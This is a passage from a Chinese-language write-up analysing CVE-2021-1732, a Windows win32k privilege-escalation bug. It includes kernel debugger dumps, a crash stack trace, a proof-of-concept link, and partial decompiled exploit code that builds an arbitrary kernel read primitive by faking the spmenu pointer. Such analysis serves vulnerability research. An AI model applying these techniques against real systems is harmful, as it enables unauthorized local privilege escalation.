class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad82ff0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad83000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad83010  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad83020  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad83030  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad83040  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6B64;&#x65F6;&#x5730;&#x5740;&#x4E3A;0x146cad82fd0&#xFF0C;&#x5185;&#x6838;&#x8C03;&#x8BD5;&#x5668;&#x8FD4;&#x56DE;win32kfull!xxxClientAllocWindowClassExtraBytes&#x51FD;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;xxxCraeteWindowEx&#x51FD;&#x6570;&#xFF0C;&#x5C06;&#x6B64;&#x503C;&#x8BBE;&#x7F6E;&#x56DE;*(tagWND+0x28)+0x128&#x5904;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615371656352.png" alt="1615371656352"></p>
+<p>&#x5728;poc&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x540E;&#xFF0C;DestoryWindow magic&#x7A97;&#x53E3;&#xFF0C;&#x7531;&#x4E8E;&#x5185;&#x90E8;&#x628A;&#x6211;&#x4EEC;&#x7684;pointer&#x5F53;&#x6210;offset&#xFF0C;&#x8D8A;&#x754C;&#x8BBF;&#x95EE;&#x5185;&#x5B58;&#xFF0C;BSOD&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615343464986.png" alt="1615343464986"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; kv</span><br><span class="line"> # Child-SP          RetAddr               : Args to Child                                                           : Call Site</span><br><span class="line"><span class="number">00</span> ffffea8c`<span class="number">947</span>b6ae8 fffff805`<span class="number">3d</span>756db2     : fffff56a`<span class="number">8</span>bf82fc<span class="number">0 00000000</span>`<span class="number">00000003</span> ffffea8c`<span class="number">947b6c50</span> fffff805`<span class="number">3d5d44d0</span> : nt!DbgBreakPointWithStatus</span><br><span class="line"><span class="number">01</span> ffffea8c`<span class="number">947</span>b6af0 fffff805`<span class="number">3d7564a7</span>     : fffff8<span class="number">05`00000003</span> ffffea8c`<span class="number">947b6c50</span> fffff805`<span class="number">3d6861a0</span> <span class="number">00000000</span>`<span class="number">00000050</span> : nt!KiBugCheckDebugBreak+<span class="number">0</span>x12</span><br><span class="line"><span class="number">02</span> ffffea8c`<span class="number">947b6b50</span> fffff805`<span class="number">3d671c27</span>     : ffffffff`ffffffd2 fffff805`<span class="number">3d780880</span> fffff56a`<span class="number">8</span>bf82fc<span class="number">0 00000000</span>`<span class="number">00040202</span> : nt!KeBugCheck<span class="number">2+0x947</span></span><br><span class="line"><span class="number">03</span> ffffea8c`<span class="number">947b7250</span> fffff805`<span class="number">3d</span>6bbe82     : <span class="number">00000000</span>`<span class="number">00000050</span> fffff56a`<span class="number">8</span>bf82fc<span class="number">0 00000000</span>`<span class="number">00000000</span> ffffea8c`<span class="number">947b7530</span> : nt!KeBugCheckEx+<span class="number">0</span>x107</span><br><span class="line"><span class="number">04</span> ffffea8c`<span class="number">947b7290</span> fffff805`<span class="number">3d</span>578aff     : ffffea8c`<span class="number">94</span>be80<span class="number">00 00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> fffff56a`<span class="number">8</span>bf82fc0 : nt!MiSystemFault+<span class="number">0x198d62</span></span><br><span class="line"><span class="number">05</span> ffffea8c`<span class="number">947b7390</span> fffff805`<span class="number">3d</span>67fb5e     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000001</span> <span class="number">00000000</span>`<span class="number">00000000</span> : nt!MmAccessFault+<span class="number">0</span>x34f</span><br><span class="line"><span class="number">06</span> ffffea8c`<span class="number">947b7530</span> fffff805`<span class="number">3d511490</span>     : <span class="number">00000000</span>`<span class="number">00008003</span> fffff805`<span class="number">3</span>e7d208d fffff423`<span class="number">000003d6</span> ffff8101`e<span class="number">1542080</span> : nt!KiPageFault+<span class="number">0</span>x35e (TrapFrame @ ffffea8c`<span class="number">947b7530</span>)</span><br><span class="line"><span class="number">07</span> ffffea8c`<span class="number">947b76c0</span> fffff805`<span class="number">3d</span>5bf27a     : <span class="number">00000000</span>`<span class="number">00000008</span> ffffea8c`<span class="number">947b77c0</span> <span class="number">00000000</span>`<span class="number">00000008</span> <span class="number">00000000</span>`<span class="number">00000003</span> : nt!RtlpHpVsContextFree+<span class="number">0</span>x570</span><br><span class="line"><span class="number">08</span> ffffea8c`<span class="number">947b7760</span> fffff805`<span class="number">3d</span>5bf1fc     : fffff423`c<span class="number">1200000</span> <span class="number">00000000</span>`<span class="number">00000000</span> fffff56a`<span class="number">8</span>bf82fd<span class="number">0 00000000</span>`<span class="number">000002a0</span> : nt!RtlpFreeHeapInternal+<span class="number">0</span>x5a</span><br><span class="line"><span class="number">09</span> ffffea8c`<span class="number">947b77e0</span> fffff456`<span class="number">4586671</span>e     : <span class="number">00000146</span>`cad82fd<span class="number">0 00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> fffff423`ce0c8eb0 : nt!RtlFreeHeap+<span class="number">0</span>x3c//&#x6CE8;&#x610F;&#x7B2C;&#x4E00;&#x53C2;&#x6570;</span><br><span class="line"><span class="number">0</span>a ffffea8c`<span class="number">947b7820</span> fffff4<span class="number">56`45863142</span>     : fffff423`c112ca<span class="number">10 00000000</span>`<span class="number">08000100</span> <span class="number">00000000</span>`<span class="number">00000000</span> fffff423`ce0c8eb0 : win32kfull!xxxFreeWindow+<span class="number">0</span>x4ba</span><br><span class="line"><span class="number">0</span>b ffffea8c`<span class="number">947b7950</span> fffff456`<span class="number">45861</span>a8a     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000020</span> : win32kfull!xxxDestroyWindow+<span class="number">0</span>x922</span><br><span class="line"><span class="number">0</span>c ffffea8c`<span class="number">947b7a50</span> fffff805`<span class="number">3d683355</span>     : cccccccc`<span class="number">40000600</span> <span class="number">00000146</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> ffff8101`e46d33e0 : win32kfull!NtUserDestroyWindow+<span class="number">0</span>x3a</span><br><span class="line"><span class="number">0d</span> ffffea8c`<span class="number">947b7a80</span> <span class="number">00007</span>fff`<span class="number">27c123e4</span>     : <span class="number">00007</span>ff7`<span class="number">7261a370</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> : nt!KiSystemServiceCopyEnd+<span class="number">0</span>x25 (TrapFrame @ ffffea8c`<span class="number">947b7a80</span>)</span><br><span class="line"><span class="number">0</span>e <span class="number">0000003</span>c`d4daf738 <span class="number">00007</span>ff7`<span class="number">7261a370</span>     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000030</span> : <span class="number">0</span>x00007fff`<span class="number">27c123e4</span></span><br><span class="line"><span class="number">0</span>f <span class="number">0000003</span>c`d4daf7<span class="number">40 00000000</span>`<span class="number">00000000</span>     : <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000030</span> cccccccc`<span class="number">00000000</span> : <span class="number">0</span>x00007ff7`<span class="number">7261a370</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8C03;&#x8BD5;&#x5668;&#x663E;&#x793A;crash&#x65F6;&#x5806;&#x6808;&#x5982;&#x4E0A;&#x6240;&#x793A;&#xFF0C;&#x4E0E;&#x6211;&#x4EEC;&#x7684;&#x6D41;&#x7A0B;&#x4E00;&#x81F4;&#x3002;</p>
+<p>crash_poc&#x5730;&#x5740;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Saturn35/POC/tree/main/CVE-2021-1732/crash_poc</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-&#x5229;&#x7528;&#x601D;&#x8DEF;"><a href="#4-&#x5229;&#x7528;&#x601D;&#x8DEF;" class="headerlink" title="4. &#x5229;&#x7528;&#x601D;&#x8DEF;"></a>4. &#x5229;&#x7528;&#x601D;&#x8DEF;</h4><ol>
+<li><h5 id="&#x5229;&#x7528;&#x6761;&#x4EF6;"><a href="#&#x5229;&#x7528;&#x6761;&#x4EF6;" class="headerlink" title="&#x5229;&#x7528;&#x6761;&#x4EF6;"></a>&#x5229;&#x7528;&#x6761;&#x4EF6;</h5></li>
+</ol>
+<p>&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x539F;&#x8BED;&#x3002;</p>
+<p>&#x666E;&#x901A;&#x7528;&#x6237;&#x8FD0;&#x884C;exp&#x5373;&#x53EF;&#x8FDB;&#x884C;&#x672C;&#x5730;&#x6743;&#x9650;&#x63D0;&#x5347;&#x3002;</p>
+<ol start="2">
+<li><h5 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;"><a href="#&#x5229;&#x7528;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5229;&#x7528;&#x8FC7;&#x7A0B;"></a>&#x5229;&#x7528;&#x8FC7;&#x7A0B;</h5></li>
+</ol>
+<h6 id="1-&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x539F;&#x8BED;"><a href="#1-&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x539F;&#x8BED;" class="headerlink" title="1.&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x539F;&#x8BED;"></a>1.<u>&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x539F;&#x8BED;</u></h6><p>&#x6B64;&#x6761;&#x4EF6;&#x7684;&#x8FBE;&#x6210;&#xFF0C;&#x5728;&#x91CE;&#x6837;&#x672C;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x65B9;&#x6CD5;GetMenuBarInfo&#xFF0C;&#x548C;&#x8FD9;&#x91CC;&#x7684;<a href="http://cvr-data.blogspot.com/2016/11/lpe-vulnerabilities-exploitation-on.html" target="_blank" rel="noopener">&#x601D;&#x8DEF;</a>&#x6BD4;&#x8F83;&#x76F8;&#x4F3C;&#x3002;</p>
+<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;GetMenuBarInfo&#x51FD;&#x6570;&#x3002;</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BOOL </span>GetMenuBarInfo(</span><br><span class="line">  HWND         hwnd,</span><br><span class="line">  LONG         idObject,</span><br><span class="line">  LONG         idItem,</span><br><span class="line">  PMENUBARINFO pmbi</span><br><span class="line">)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">typedef struct tagMENUBARINFO {</span><br><span class="line">  DWORD cbSize<span class="comment">;</span></span><br><span class="line">  RECT  rcBar<span class="comment">;</span></span><br><span class="line">  HMENU hMenu<span class="comment">;</span></span><br><span class="line">  HWND  hwndMenu<span class="comment">;</span></span><br><span class="line">  <span class="keyword">BOOL </span> fBarFocused : <span class="number">1</span><span class="comment">;</span></span><br><span class="line">  <span class="keyword">BOOL </span> fFocused : <span class="number">1</span><span class="comment">;</span></span><br><span class="line">  <span class="keyword">BOOL </span> fUnused : <span class="number">30</span><span class="comment">;</span></span><br><span class="line">} MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">typedef struct tagRECT {</span><br><span class="line">  LONG left<span class="comment">;</span></span><br><span class="line">  LONG top<span class="comment">;</span></span><br><span class="line">  LONG right<span class="comment">;</span></span><br><span class="line">  LONG <span class="keyword">bottom;</span></span><br><span class="line"><span class="keyword">} </span>RECT, *PRECT, *NPRECT, *LPRECT<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x7EC8;&#x8C03;&#x7528;Win32kfull!NtUserGetMenuBarInfo,&#x53C2;&#x6570;&#x4E0E;&#x7528;&#x6237;&#x5C42;&#x76F8;&#x540C;&#x3002;&#x6B64;&#x51FD;&#x6570;&#x4E2D;&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;tagWND&#x5730;&#x5740;&#xFF0C;&#x4F20;&#x5165;Win32kfull!xxxGetMenuBarInfo&#x51FD;&#x6570;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615376600000.png" alt="1615376600000"></p>
+<p>&#x6B64;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x9700;&#x8981;&#x8D8A;&#x8FC7;&#x6761;&#x4EF6;&#xFF0C;&#x9996;&#x5148;&#x4F20;&#x5165;&#x7B2C;&#x4E8C;&#x53C2;&#x6570;&#x9700;&#x8981;&#x4E3A;-3&#xFF0C;&#x53EA;&#x9700;&#x5728;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E2D;&#x5411;GetMenuBarInfo&#x51FD;&#x6570;&#x7B2C;&#x4E8C;&#x53C2;&#x6570;&#x4F20;&#x5165;-3&#x5373;&#x53EF;&#x3002;&#x540C;&#x65F6;&#x6B64;&#x7A97;&#x53E3;&#x7684;tagWND&#x6210;&#x5458;spmenu&#xFF08;tagMENU&#x7C7B;&#x578B;&#xFF09;&#xFF0C;&#x5B83;&#x6240;&#x5728;&#x5185;&#x5B58;0x98&#x5904;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x8BB0;&#x4E3A;mem_4&#xFF0C;mem_4&#x5904;&#x5B58;&#x50A8;&#x7684;&#x6307;&#x9488;&#x8BB0;&#x4E3A;mem_200&#xFF0C;&#x63A5;&#x7740;*(*mem_4+0x40)&#x4EE5;&#x53CA;*(*mem_4+0x44)&#x9700;&#x8981;&#x4E0D;&#x4E3A;0&#xFF0C;&#x4E5F;&#x5373;&#x5C31;&#x662F;*(mem_200+0x40)&#x548C;*(mem_200+0x44)&#x5904;&#x4E0D;&#x4E3A;0&#x3002;</p>
+<p>&#x63A5;&#x7740;&#xFF0C;v6&#x5373;&#x4F20;&#x5165;&#x7684;&#x7B2C;&#x4E09;&#x53C2;&#x6570;&#x9700;&#x8981;&#x4E3A;&#x975E;&#x96F6;&#x503C;&#xFF0C;&#x4E14;&#x540E;&#x7EED;&#x7528;&#x6B64;&#x503C;&#x4F5C;&#x4E3A;index&#x8FDB;&#x884C;&#x504F;&#x79FB;&#x8BA1;&#x7B97;&#xFF0C;&#x56E0;&#x6B64;&#x6B64;&#x503C;&#x7ECF;&#x63A8;&#x65AD;&#x53EA;&#x80FD;&#x53D6;1&#xFF0C;&#x540C;&#x6837;&#x53EA;&#x9700;&#x5728;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E2D;&#x5411;GetMenuBarInfo&#x51FD;&#x6570;&#x7B2C;&#x4E09;&#x53C2;&#x6570;&#x4F20;&#x5165;1&#x5373;&#x53EF;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615377384132.png" alt="1615377384132"></p>
+<p>&#x8FD8;&#x6709;&#x4E00;&#x5904;&#x6CA1;&#x6709;&#x6807;&#x51FA;&#x6765;&#x7684;&#x9700;&#x8981;&#x8D8A;&#x8FC7;&#xFF0C;&#x4E8B;&#x5B9E;&#x4E0A;&#x6709;&#x4E09;&#x5904;&#xFF0C;&#x6B63;&#x662F;menubarinfo.rcBar.left&#x884C;&#x4E0A;&#x9762;&#x7684;if&#x8BED;&#x53E5;&#xFF0C;&#x5373;&#x9700;&#x8981;&#x4F7F;tagWND+0x28&#x5904;&#x4E5F;&#x5373;&#x5C31;&#x662F;v37&#x5185;&#x5BB9;&#x4E3A;0&#x3002;</p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x91CD;&#x70B9;&#x662F;&#x5982;&#x4F55;&#x8BFB;&#xFF0C;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5185;&#x6838;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x539F;&#x8BED;&#x9996;&#x5148;&#x9700;&#x8981;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x8BFB;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7531;&#x5916;&#x90E8;&#x6307;&#x5B9A;&#x7684;kernel&#x5730;&#x5740;&#xFF0C;&#x6B64;&#x5730;&#x5740;&#x5728;x64&#x4E0B;&#x9700;&#x8981;&#x5206;&#x4E3A;&#x9AD8;4&#x4F4D;&#x548C;&#x4F4E;4&#x4F4D;&#x3002;&#x5728;&#x6211;&#x4EEC;&#x6807;&#x51FA;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x63D0;&#x5230;&#x7684;&#x53E6;&#x5916;&#x4E24;&#x5904;*(tagWND+0x28)+0x58&#x4EE5;&#x53CA;*(tagWND+0x28)+0x5C&#x5904;&#x503C;&#x9700;&#x8981;&#x4E3A;0&#xFF0C;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x505A;&#x5230;&#x5BF9;&#x76EE;&#x6807;&#x5730;&#x5740;&#x89E3;&#x661F;&#x53F7;&#x3002;</p>
+<p>&#x89E3;&#x5F15;&#x7528;&#x65F6;&#x56E0;&#x4E3A;&#x8BBF;&#x95EE;&#x7684;&#x5206;&#x522B;&#x662F;&#x504F;&#x79FB;&#x4E3A;0x40&#x4EE5;&#x53CA;0x44&#x5904;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5728;&#x5411;&#x6B64;&#x5904;&#x5199;kerneladdress&#x65F6;&#x9700;&#x8981;&#x51CF;&#x53BB;0x40&#x3002;&#x8C03;&#x8BD5;&#x53EF;&#x77E5;&#xFF0C;&#x6B64;&#x503C;&#x4E3A;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;menubar.rcBar.left&#x548C;menubar.rcBar.top&#x7684;&#x503C;&#x3002;</p>
+<p>&#x89E3;&#x51B3;&#x4E86;&#x4E0A;&#x8FF0;&#x6761;&#x4EF6;&#x9650;&#x5236;&#x6211;&#x4EEC;&#x5373;&#x53EF;&#x8FDB;&#x884C;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x3002;</p>
+<p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x5982;&#x4F55;&#x4FEE;&#x6539;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7684;tagWND&#x7ED3;&#x6784;&#x7684;spmenu&#x6307;&#x9488;&#xFF0C;&#x6B64;&#x6307;&#x9488;&#x7C7B;&#x578B;&#x4E3A;tagMENU&#x3002;&#x5728;&#x9605;&#x8BFB;&#x4E86;&#x8D8B;&#x52BF;&#x79D1;&#x6280;&#x7684;&#x4E00;&#x7BC7;<a href="https://www.trendmicro.com/en_us/research/16/l/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild.html" target="_blank" rel="noopener">&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x6587;&#x7AE0;</a>&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x4EE5;&#x4E0B;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x3002;</p>
+<p>&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x4EE3;&#x7801;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD; &#x7528;&#x4EFB;&#x4F55;&#x4E1C;&#x897F;&#x66FF;&#x6362;&#x76EE;&#x6807;&#x7A97;&#x53E3;&#x7684;spmenu&#x503C;&#x7684;&#x65B9;&#x6CD5;&#x3002;win32k&#x51FD;&#x6570;<em>xxxNextWindow<em>&#x83B7;&#x53D6;&#x76EE;&#x6807;&#x7A97;&#x53E3;&#x7684;</em>spmenu</em> &#x503C;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x4F5C;&#x4E3A;&#x6307;&#x5411;<em>tagMenu</em>&#x5BF9;&#x8C61;&#x7684;&#x6307;&#x9488;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614588640393.png" alt="1614588640393"></p>
+<p>&#x9996;&#x5148;&#x589E;&#x52A0;&#x7A97;&#x53E3;&#x6837;&#x5F0F;WS_CHILD(0x4000000000000000),&#x8C03;&#x7528;SetWindowLongPtr,&#x5F53;&#x7B2C;&#x4E8C;&#x53C2;&#x6570;&#x4E3A;(GWLP_ID)&#x65F6;&#xFF0C;&#x5219;&#x53EF;&#x8BBE;&#x7F6E;&#x4EFB;&#x610F;&#x503C;&#x5230;tagWND&#x7684;spmenu&#x6210;&#x5458;&#x3002;&#x800C;&#x7A97;&#x53E3;&#x6837;&#x5F0F;&#x6210;&#x5458;&#x5728;x64&#x4E0B;&#x4F4D;&#x4E8E;tagWND&#x7684;0x18&#x5904;&#x3002;</p>
+<p>&#x56E0;&#x6B64;&#xFF0C;&#x6784;&#x9020;&#x8BFB;&#x539F;&#x8BED;&#x7684;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//&#x8BBE;&#x7F6E;fake_spmenu&#x4E3A;_mem_zeroinit_A0&#xFF0C;&#x5373;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x540E;&#x7EED;&#x8FDB;&#x884C;&#x5185;&#x5B58;&#x6784;&#x9020;&#x3002;</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////</span></span><br><span class="line"> <span class="keyword">if</span> ( <span class="variable">_X64_</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="variable">_Offset_18</span>;                            <span class="comment">// ExStyle</span></span><br><span class="line">    v5 = *(<span class="variable">_QWORD</span> *)(<span class="variable">_hWnd1_ptagWND</span> + <span class="number">8</span> * ((unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_18</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    v6 = v5 ^ <span class="number">0</span>x4000000000000000i64;            <span class="comment">// ExStyle^=WS_CHILD </span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="variable">_Offset_1C</span>;</span><br><span class="line">    v5 = *(unsigned int *)(<span class="variable">_hWnd1_ptagWND</span> + <span class="number">4</span> * ((unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_1C</span> &gt;&gt; <span class="number">2</span>));</span><br><span class="line">    v6 = v5 ^ <span class="number">0</span>x40000000;</span><br><span class="line">  }</span><br><span class="line">  new_Style = v6;</span><br><span class="line">  old_Style = v5;</span><br><span class="line">  SetWindowLongPtrA(<span class="variable">_hWnd0</span>, v4 + <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>, v6);<span class="comment">// &#x5229;&#x7528;&#x7A97;&#x53E3;&#x7ED3;&#x6784;&#x504F;&#x79FB; &#x8BBE;&#x7F6E;hWnd1&#x7684;dwStyle ^=WS_CHILD</span></span><br><span class="line">  v7 = SetWindowLongPtrA(<span class="variable">_hWnd1</span>, <span class="number">0</span>xFFFFFFF4, <span class="variable">_mem_zeroinit_A0h</span>);<span class="comment">// GWLP_ID=-12  &#x8BBE;&#x7F6E;&#x5B50;&#x7A97;&#x53E3;&#x7684;&#x65B0;&#x6807;&#x8BC6;&#x7B26;&#x3002; &#x8BE5;&#x7A97;&#x53E3;&#x4E0D;&#x80FD;&#x662F;&#x9876;&#x7EA7;&#x7A97;&#x53E3;&#x3002;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//&#x5185;&#x5B58;&#x6784;&#x9020;&#x3002;</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="variable">_mem_zeroinit_200h</span> = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">0</span>x200i64);<span class="comment">// LMEM_ZEROINIT</span></span><br><span class="line">  <span class="variable">_mem_zeroinit_30h</span> = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">0</span>x30i64);</span><br><span class="line">  <span class="variable">_mem_zeroinit_4</span> = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">4</span>i64);</span><br><span class="line">  <span class="variable">_mem_zeroinit_A0h</span> = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">0</span>xA0i64);</span><br><span class="line">  v6 = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">8</span>i64);</span><br><span class="line">  v7 = (<span class="variable">_DWORD</span> *)<span class="variable">_mem_zeroinit_200h</span>;</span><br><span class="line">  v8 = v6;</span><br><span class="line">  v9 = <span class="variable">_mem_zeroinit_30h</span>;</span><br><span class="line">  v10 = <span class="variable">_mem_zeroinit_4</span>;</span><br><span class="line">  v11 = <span class="variable">_mem_zeroinit_A0h</span>;</span><br><span class="line">  <span class="variable">_mem_zeroinit_8</span> = v6;</span><br><span class="line">  v12 = (unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_40</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  *(<span class="variable">_DWORD</span> *)(<span class="variable">_mem_zeroinit_30h</span> + <span class="number">4</span> * ((unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_2C</span> 